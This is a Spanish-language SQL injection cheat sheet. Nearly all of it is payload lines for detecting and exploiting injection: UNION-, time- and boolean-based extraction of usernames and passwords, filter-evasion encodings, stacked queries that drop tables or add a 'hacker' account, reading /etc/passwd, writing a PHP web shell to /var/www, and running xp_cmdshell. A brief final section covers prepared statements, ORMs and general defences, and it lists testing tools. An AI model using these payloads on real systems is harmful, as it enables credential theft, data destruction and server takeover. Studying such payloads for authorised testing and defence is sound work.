# SQL Injection Cheat Sheet

## Detección Básica

### 1. Pruebas Simples
```sql
-- Caracteres básicos de prueba
'
"
`
')
")
`)
'))
"))
`))

-- Operadores lógicos
OR 1=1
AND 1=1
AND 1=2
OR 'a'='a
OR 'a'='b
```

### 2. Inyecciones de Error
```sql
-- Errores de sintaxis
'convert(int,@@version)--
'+CAST('1' as int)+'
@@version
```

## Técnicas de Extracción

### 1. UNION Based
```sql
-- Determinar número de columnas
UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL--

-- Extracción de datos
UNION SELECT username,password FROM users--
UNION SELECT table_name,NULL FROM information_schema.tables--
```

### 2. Time Based
```sql
-- Inyecciones basadas en tiempo
'; WAITFOR DELAY '0:0:10'--
'; IF (SELECT COUNT(*) FROM users) > 100 WAITFOR DELAY '0:0:10'--

-- Extracción bit a bit
IF ASCII(SUBSTRING((SELECT TOP 1 name FROM users),1,1)) > 70 WAITFOR DELAY '0:0:10'
```

### 3. Boolean Based
```sql
-- Extracciones booleanas
AND 1=1
AND (SELECT TOP 1 name FROM users) > 'a'
AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1)) > 70
```

## Bypass Techniques

### 1. Evasión de Filtros
```sql
-- Comentarios alternativos
/*
//
--
#
;%00

-- Codificación
SELECT -> SEL%45CT
UNION -> UN%49ON
```

### 2. Casos Especiales
```sql
-- Bypass de comillas
admin' -> admin'+OR+'1'='1

-- Bypass de espacios
SELECT/**/password/**/FROM/**/users
```

## Extracción de Información

### 1. Information Schema
```sql
-- Enumerar bases de datos
SELECT schema_name FROM information_schema.schemata

-- Enumerar tablas
SELECT table_name FROM information_schema.tables

-- Enumerar columnas
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### 2. Database Info
```sql
-- Versión
SELECT @@version

-- Usuario actual
SELECT user
SELECT current_user
SELECT system_user

-- Base de datos actual
SELECT database()
```

## Comandos Avanzados

### 1. Stacked Queries
```sql
-- Múltiples consultas
; DROP TABLE users--
; INSERT INTO users VALUES ('hacker','pass123')--
```

### 2. File Operations
```sql
-- Lectura/escritura de archivos (MySQL)
LOAD_FILE('/etc/passwd')
INTO OUTFILE '/var/www/shell.php'

-- SQL Server xp_cmdshell
EXEC xp_cmdshell 'net user'
```

## Prevención

### 1. Prepared Statements
```python
# Python (con SQLite3)
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# PHP (con MySQL)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
```

### 2. ORM Usage
```python
# Django
User.objects.filter(id=user_id)

# SQLAlchemy
session.query(User).filter(User.id == user_id)
```

### 3. Buenas Prácticas
- Usar prepared statements siempre
- Implementar WAF (Web Application Firewall)
- Principio de mínimo privilegio
- Sanitizar y validar todas las entradas
- Manejo adecuado de errores
- Auditorías regulares de código
- Mantener sistemas actualizados

## Herramientas Útiles
- SQLmap
- Burp Suite
- OWASP ZAP
- SQLninja
- NoSQLmap (para bases NoSQL)
